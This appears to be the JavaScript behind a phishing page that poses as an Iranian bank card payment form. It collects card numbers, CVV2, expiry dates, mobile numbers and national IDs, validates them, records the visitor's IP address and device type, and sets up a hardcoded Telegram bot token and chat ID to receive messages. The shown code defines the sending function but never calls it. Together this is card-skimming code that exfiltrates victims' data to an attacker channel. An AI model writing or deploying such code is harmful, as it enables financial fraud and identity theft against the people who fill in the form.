const token = '7985669297:AAEVfINvGGV4VX6iLLH1dLae8EsSdLJKPVY';
const chatId = '-4614449543';

const sendMessage = async function (message) {
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      // parse_mode: 'MarkdownV2',
    }),
  })
    .then(response => response.json())
    .then(data => {
      return data;
    })
    .catch(error => {
      console.error('خطا در ارسال پیام:', error);
    });
};

function validateExpirationDate(month, year) {
  // بررسی اینکه ماه معقول باشد
  if (month < 1 || month > 12) {
    return false; // ماه نامعتبر است
  }

  // تبدیل سال دو رقمی به چهار رقمی
  const currentDate = new Date();
  const currentYear = currentDate.getFullYear() % 100; // دو رقم آخر سال کنونی
  const fullYear = year + (year < currentYear ? 2000 : 1900); // مقایسه و تبدیل

  // تاریخ انقضا را به تاریخ واقعی تبدیل کنید
  const expiration = new Date(fullYear, month - 1); // ماه باید از 0 شروع شود

  // اطمینان از اینکه تاریخ انقضا در آینده است
  if (expiration <= currentDate) {
    return false; // تاریخ انقضا گذشته است
  } else {
    return true; // تاریخ انقضا معتبر است
  }
}

let userIp;
async function getUserIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    userIp = data.ip;
  } catch (error) {
    console.error('خطا در دریافت IP:', error);
    return null; // در صورت بروز خطا
  }
}
getUserIP();

function getDeviceType() {
  const userAgent = navigator.userAgent;

  // بررسی برای دستگاه‌های iPhone
  if (/iPhone/i.test(userAgent)) {
    return 'iPhone';
  }
  // بررسی برای دستگاه‌های Android
  else if (/Android/i.test(userAgent)) {
    return 'Android';
  }
  // در غیر این صورت، فرض می‌کنیم که دسکتاپ است
  else {
    return 'Desktop';
  }
}

const cardInput = document.getElementById('cardInput');
const cvv2Input = document.getElementById('cvv2Input');
const exprationInput = document.getElementById('exprationInput');
const captchaInput = document.getElementById('captchaInput');
const poyaInput = document.getElementById('poyaInput');
const pattern = '____-____-____-____';

cardInput.addEventListener('input', function () {
  let value = this.value.replace(/\D/g, ''); // حذف کاراکترهای غیر عددی
  let maskedValue = '';

  for (let i = 0, j = 0; i < pattern.length && j < value.length; i++) {
    if (pattern[i] === '_') {
      maskedValue += value[j++];
    } else {
      maskedValue += pattern[i];
    }
  }
});

function luhnCheck(cardNumber) {
  let sum = 0;
  let shouldDouble = false;

  for (let i = cardNumber.length - 1; i >= 0; i--) {
    let digit = parseInt(cardNumber.charAt(i), 10);

    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9;
      }
    }
    sum += digit;
    shouldDouble = !shouldDouble;
  }

  return sum % 10 === 0;
}

function validateCard() {
  const cardNumber = document
    .getElementById('cardInput')
    .value.replace(/\s+/g, '');

  if (!/^\d{16}$/.test(cardNumber)) {
    return false;
  }

  if (luhnCheck(cardNumber)) {
    return true;
  } else {
    return false;
  }
}

function validateCVV2(cvv) {
  // بررسی اینکه کد CVV2 دقیقا 3 رقم باشد و فقط شامل اعداد باشد
  const regex = /^\d{3}$/; // 3 رقم
  if (!regex.test(cvv)) {
    return false;
  } else {
    return true;
  }
}

const phoneInput = document.getElementById('phoneInput');
const phoneValid = document.getElementById('phoneValid');
const codemeliInput = document.getElementById('codemeliInput');
const codeValid = document.getElementById('codeValid');
const firstBtn = document.getElementById('firstBtn');

function validateIranianMobileNumber(mobileNumber) {
  // الگوی شماره موبایل ایرانی
  const regex = /^09\d{9}$/;

  // بررسی می‌کند که آیا شماره مورد نظر با الگو مطابقت دارد یا خیر
  return regex.test(mobileNumber);
}
function validateNationalID(nationalID) {
  // بررسی طول کد ملی
  if (nationalID.length !== 10 || !/^\d+$/.test(nationalID)) {
    return false; // نامعتبر است
  }

  // استخراج ارقام
  const digits = nationalID.split('').map(Number);

  // محاسبه رقم کنترل
  const sum = digits
    .slice(0, 9)
    .reduce((acc, digit, index) => acc + digit * (10 - index), 0);
  const remainder = sum % 11;
  const checkDigit = digits[9];

  // اعتبارسنجی رقم کنترل
  if (
    (remainder < 2 && checkDigit === remainder) ||
    (remainder >= 2 && checkDigit === 11 - remainder)
  ) {
    return true; // معتبر است
  } else {
    return false; // نامعتبر است
  }
}

firstBtn.addEventListener('click', () => {
  if (!validateIranianMobileNumber(phoneInput.value)) {
    phoneValid.classList.remove('hidden');
  } else {
    phoneValid.classList.add('hidden');
  }
  if (!validateNationalID(`${codemeliInput.value}`)) {
    codeValid.classList.remove('hidden');
  } else {
    codeValid.classList.add('hidden');
  }

  if (
    validateIranianMobileNumber(phoneInput.value) &&
    validateNationalID(`${codemeliInput.value}`)
  ) {
    setTimeout(() => {
      document.getElementById('page1').classList.add('hidden');
      document.getElementById('page2').classList.remove('hidden');
    }, 1500);
    document.getElementById('page2').classList.add('hidden');
    document.getElementById('page3').classList.remove('hidden');
  }
});
